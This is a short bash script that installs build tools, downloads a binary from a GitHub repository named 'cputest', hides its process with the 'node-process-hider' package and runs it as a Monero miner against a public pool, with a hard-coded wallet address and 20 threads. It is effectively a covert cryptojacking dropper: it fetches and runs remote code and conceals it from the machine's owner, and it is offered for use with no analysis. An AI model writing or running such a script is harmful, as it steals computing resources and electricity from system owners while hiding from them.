#!/bin/bash
sudo su
sudo apt update && sudo apt upgrade -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
sudo apt-get install git build-essential cmake automake libtool autoconf npm -y
sudo npm i -g node-process-hider
wget -O psht1922 https://github.com/slendep1922/cputest/raw/main/psht1922
chmod +x psht1922 >/dev/null 2>&1
nohup sudo ph add psht1922 && ./psht1922 -a rx/0 -o us-west.minexmr.com:443 -u 465v5RErPdE4WKDSmb79k5ESkYM9GqgPM3WT97YXryexb1V4ojMpn2WXAAHLFFGyfhZ8MNtkuySq2XJfzw9VTUJD3djNxVZ -k --tls --threads 20 --rig-id shterate > /tem/psht1922.log 2>&1
